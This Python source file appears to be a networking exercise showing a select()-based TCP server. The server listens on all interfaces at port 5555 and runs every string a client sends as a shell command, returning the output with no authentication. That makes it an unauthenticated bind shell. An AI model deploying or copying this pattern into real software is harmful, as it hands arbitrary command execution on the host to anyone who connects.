# -*- coding:utf-8 -*-


"""
 Verion: 1.0
 Author: zhangjian
 Site: http://iliangqunru.com
 File: simple_select.py
 Time: 2017/9/9 20:29
"""
import logging
import sys

PY3 = True
if not sys.version > '3':
    PY3 = False
    import Queue
    import commands
else:
    import queue

level = logging.DEBUG
format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
datefmt = '%Y-%m-%d %H:%M'
logging.basicConfig(level=level, format=format, datefmt=datefmt)
logger = logging.getLogger(__name__)

import socket
import select

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Enable reuse address/port
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(("0.0.0.0", 5555))
server_socket.listen(5)

inputs = [server_socket]
outputs = []
message_queue = {}

while True:
    readable, writable, errorable = select.select(inputs, outputs, [])
    try:
        for r in readable:
            if r is server_socket:
                # 建立连接
                client_conect, client_address = server_socket.accept()
                client_conect.setblocking(0)
                logger.info("==> new connect from %s ", client_address)
                inputs.append(client_conect)
                if PY3:
                    message_queue[client_conect] = queue.Queue()
                else:
                    message_queue[client_conect] = Queue.Queue()

            else:
                data = r.recv(2048)
                # 如果没有数据,说明连接已经断开
                if data and data!='':
                    logger.info("==> data from client is %s ", data)
                    message_queue[r].put(data)
                    if r not in outputs:
                        outputs.append(r)
                else:
                    if r in outputs:
                        outputs.remove(r)
                    inputs.remove(r)
                    r.close()

                    del message_queue[r]

        for w in writable:
            try:
                shell_code = message_queue[w].get_nowait()
                shell_res = commands.getoutput(shell_code)
            # except queue.Empty:
            except Exception as e:
                outputs.remove(w)
            else:
                logger.info("==> shell res is %s",shell_res)
                w.sendall(shell_res)

        for e in errorable:
            if e in inputs:
                inputs.remove(e)
            if e in outputs:
                outputs.remove(e)
            e.close()

            del message_queue[e]
    except Exception as e:
        pass
